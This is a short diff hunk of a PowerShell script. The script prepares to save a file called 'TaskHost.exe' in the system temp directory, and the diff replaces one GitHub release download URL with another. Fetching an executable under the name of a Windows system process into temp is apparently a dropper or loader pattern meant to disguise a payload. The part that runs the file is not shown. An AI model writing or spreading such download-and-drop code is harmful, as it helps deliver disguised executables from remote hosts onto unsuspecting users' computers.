@@ -6,7 +6,7 @@ $tempDir = [System.IO.Path]::GetTempPath()
 $out = Join-Path $tempDir "TaskHost.exe"
 
 # Replace with a stable direct URL to your file
-$directUrl = "https://github.com/nickjonoob-hub/kenoxreg/releases/download/KENOX/TaskHost.exe"
+$directUrl = "https://github.com/kbosskk1-web/kenoxontopppp/releases/download/kenox/TaskHost.exe"
 
 # --- UI ---
 Write-Host ""
